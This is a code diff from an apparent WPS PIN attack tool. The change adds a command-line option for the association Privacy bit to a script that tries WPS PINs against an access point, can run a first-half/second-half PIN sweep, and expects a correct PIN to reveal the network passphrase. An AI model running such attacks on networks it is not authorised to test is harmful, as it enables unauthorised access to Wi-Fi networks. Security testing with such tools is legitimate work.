@@ -147,10 +147,12 @@ async def find_ap(iface, array, channel: int, bssid: str | None, ssid: str | Non
 
 
 async def run_one_attempt(iface, bssid: str, ssid: str, channel: int, our_mac: bytes,
-                          pin: str, expect: str, capture: list) -> None:
-    step(f"Attempt PIN {pin}  (expect: {expect})")
+                          pin: str, expect: str, capture: list, privacy=None) -> None:
+    step(f"Attempt PIN {pin}  (expect: {expect}, assoc privacy bit="
+         f"{'auto' if privacy is None else ('on' if privacy else 'off')})")
     assoc = Association(iface, bssid, ssid, channel, our_mac=our_mac,
-                        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR))
+                        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR),
+                        privacy=privacy)
     assoc.start()
     # Record our TX frames into the same capture list as RX → full-conversation pcap.
     transport = WlanTransport(iface, str_to_mac(bssid), our_mac,
@@ -234,8 +236,10 @@ async def main_async(args) -> int:
                 (derive_wrong_pin(known_pin), "incorrect: second half wrong"),
                 (known_pin, "CORRECT: should reveal PSK"),
             ]
+        privacy = {"auto": None, "on": True, "off": False}[args.privacy]
         for i, (pin, expect) in enumerate(attempts):
-            await run_one_attempt(iface, bssid, ssid, channel, our_mac, pin, expect, capture)
+            await run_one_attempt(iface, bssid, ssid, channel, our_mac, pin, expect, capture,
+                                  privacy=privacy)
             if i + 1 < len(attempts):
                 info(f"Re-associating for next attempt in {args.attempt_gap:.0f}s …")
                 await asyncio.sleep(args.attempt_gap)
@@ -260,6 +264,8 @@ def main() -> int:
     p.add_argument("--campaign", action="store_true",
                    help="run the full WpsCampaign sweep (COMMON->first-half->second-half) instead of the probe pair")
     p.add_argument("--max-secs", type=float, default=120.0, help="campaign time budget")
+    p.add_argument("--privacy", choices=["auto", "on", "off"], default="auto",
+                   help="assoc-request Privacy capability bit (auto: off for a WPS assoc)")
     p.add_argument("--scan-secs", type=float, default=6.0)
     p.add_argument("--attempt-gap", type=float, default=3.0, help="delay between the two attempts")
     p.add_argument("--out", default="wifit3-wps-probe.pcap", help="pcap output path")
